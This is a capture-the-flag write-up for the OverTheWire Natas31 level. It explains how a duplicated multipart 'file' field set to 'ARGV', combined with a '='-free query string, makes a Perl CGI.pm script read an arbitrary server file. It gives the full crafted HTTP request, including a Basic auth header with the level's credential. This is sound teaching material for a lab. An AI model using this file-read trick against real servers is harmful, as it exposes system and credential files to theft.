# Natas31 → Natas32 Writeup (OverTheWire)

**Goal:** Read `/etc/natas_webpass/natas32` and obtain the password for `natas32`.
**Tools used:** Burp Suite, Browser


## 1. Recon

Visiting the natas31 page shows a simple "CSV2HTML" tool: you upload a `.csv` file and the server renders it as an HTML table.

The page source (`index.pl`) is provided on the challenge page. The relevant part is:

```perl
my $cgi = CGI->new;
if ($cgi->upload('file')) {
    my $file = $cgi->param('file');
    print '<table class="sortable table table-hover table-striped">';
    $i=0;
    while (<$file>) {
        my @elements=split /,/, $_;
        ...
    }
    print '</table>';
}
```

Two lines matter here:

- `my $file = $cgi->param('file');` — this pulls the value of the `file` parameter in **scalar context**, so if there are multiple `file` fields in the upload, it takes the *first* one.
- `while (<$file>)` — `$file` is then used as a filehandle. In Perl, if the variable holding the "filehandle" is a plain string instead of a real filehandle/glob, Perl treats it as an **indirect/bareword filehandle** i.e. it looks up a filehandle with that literal name.

So if we can make `$file` contain the string `"ARGV"`, the loop becomes `while (<ARGV>)`, which is Perl's special "diamond operator" behavior: it reads from whatever files are listed in the `@ARGV` array (falling back to STDIN if `@ARGV` is empty).

## 2. The missing piece: populating `@ARGV`

Reading from `<ARGV>` is only useful if `@ARGV` contains a filename we want to read, in our case `/etc/natas_webpass/natas32`.

This is where `CGI.pm` itself helps us. From `CGI.pm`'s documented "keyword list" behavior: if a script is invoked with a query string that does **not** contain an `=` sign (i.e. it doesn't look like `key=value` pairs), `CGI.pm` treats the entire query string as a list of keywords and it also stores that same list into `@ARGV` for backward compatibility with older CGI scripts.

That means a request like:

```
POST /index.pl?/etc/natas_webpass/natas32 HTTP/1.1
```

has a query string of `/etc/natas_webpass/natas32` with no `=` in it, so `CGI.pm` automatically sets:

```perl
@ARGV = ("/etc/natas_webpass/natas32");
```

Combine this with the `while (<ARGV>)` trick above, and the script will open and read `/etc/natas_webpass/natas32` for us, printing its contents into the HTML table.

## 3. Building the request in Burp Suite

1. With Burp running and the browser proxied through it, open `http://natas31.natas.labs.overthewire.org/` and upload any CSV file (content doesn't matter). I used:

   ```csv
   1,2,
   3,4,
   ```

2. In **Proxy → HTTP history**, find the `POST /index.pl` request, right-click it and choose **Send to Repeater**.

3. In Repeater, make two changes:

   **a) Query string** — append the target file path with no `=` sign, so `CGI.pm` populates `@ARGV`:

   ```
   POST /index.pl?/etc/natas_webpass/natas32 HTTP/1.1
   ```

   **b) Body** — the original request has one `file` part (the actual CSV upload). Duplicate the `file` field: add a **plain text** `file` part *before* the real upload part, with the value `ARGV`. Copy an existing form-data block and edit it so it looks like this:

   ```
   ------WebKitFormBoundaryTX9zt4boIRWyKl5P
   Content-Disposition: form-data; name="file"
   Content-Type: text/plain

   ARGV
   ------WebKitFormBoundaryTX9zt4boIRWyKl5P
   Content-Disposition: form-data; name="file"; filename="test.csv"
   Content-Type: text/csv

   1,2,
   3,4,
   ------WebKitFormBoundaryTX9zt4boIRWyKl5P
   Content-Disposition: form-data; name="submit"

   Upload
   ------WebKitFormBoundaryTX9zt4boIRWyKl5P--
   ```

   Because both parts are named `file`, `$cgi->param('file')` in scalar context returns the **first** one, the plain text value `"ARGV"` which is exactly what we need `$file` to hold.

   Don't forget to update `Content-Length` to match the new body (Burp does this automatically when you send the request from Repeater).

## 4. Full request

```
POST /index.pl?/etc/natas_webpass/natas32 HTTP/1.1
Host: natas31.natas.labs.overthewire.org
Content-Length: <auto>
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMTphUXpyaXJ4d2QyV2lhb3E4SG5TamNjOElVV2x4ZGQxeg==
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTX9zt4boIRWyKl5P
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Origin: http://natas31.natas.labs.overthewire.org
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://natas31.natas.labs.overthewire.org/
Connection: keep-alive

------WebKitFormBoundaryTX9zt4boIRWyKl5P
Content-Disposition: form-data; name="file"
Content-Type: text/plain

ARGV
------WebKitFormBoundaryTX9zt4boIRWyKl5P
Content-Disposition: form-data; name="file"; filename="test.csv"
Content-Type: text/csv

1,2,
3,4,
------WebKitFormBoundaryTX9zt4boIRWyKl5P
Content-Disposition: form-data; name="submit"

Upload
------WebKitFormBoundaryTX9zt4boIRWyKl5P--
```

## 5. Result

Sending this request from Repeater returns the rendered HTML table but instead of our CSV rows, the first "row" of the table is the content of `/etc/natas_webpass/natas32`: the password for the next level.
